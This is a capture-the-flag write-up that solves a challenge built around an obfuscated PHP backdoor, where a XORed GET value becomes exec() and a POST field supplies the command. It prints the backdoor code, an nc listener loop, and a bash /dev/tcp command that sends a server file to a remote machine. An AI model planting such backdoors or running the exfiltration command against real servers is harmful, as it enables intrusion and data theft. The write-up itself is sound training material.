# open my backdoor

## Description:

> 毛哥是一位年輕有為且腿毛多的資安研究員

> 並且毛哥還是一位 PHP 大師，所以他在伺服器上放了只有他自己才看得懂的 PHP 後門

> 但由於毛哥平時過於驕傲自大，你決定給他點顏色瞧瞧

> 請你開他的後門，把藏在深處的那把 flag 挖出來吧!

The backdoor:

```php


<?php
set_time_limit(3);
ini_set('max_execution_time', 3);
highlight_file(__FILE__);$f=file(__FILE__);

$c=chr(substr_count($f[1],chr(32)));
$x=(substr($_GET[87],0,4)^"d00r");$x(${"_\x50\x4f\x53\x54"}{$c});
```

## Solution:

`$c` is evaluated to be `#` since there are 35 spaces on the second line.

I can control the `GET` parameter with `?87=value` such that after xor with `"d00r"`, it will become a function which will be called at the end. Entering `\%01\%48\%55\%11` will result in the function `exec()`.

I can also control the parameter of `POST` with `curl -d "#=command" -X POST`. Since `exec()` will not show any output on the web page, I will send the output to my machine with a reverse tunnel.

On my machine, I set up a listener to receive the output with the following command:

```console
root@kali:~# while [ true ]; do nc -l PORT; done
```

Then, I will get the flag with the following command:

```console
root@kali:~# /bin/bash -c 'exec 5<>/dev/tcp/MY_IP/PORT; /bin/cat /flag_is_here >&5'
```

`FLAG{do_u_like_my_d0000000r?}`
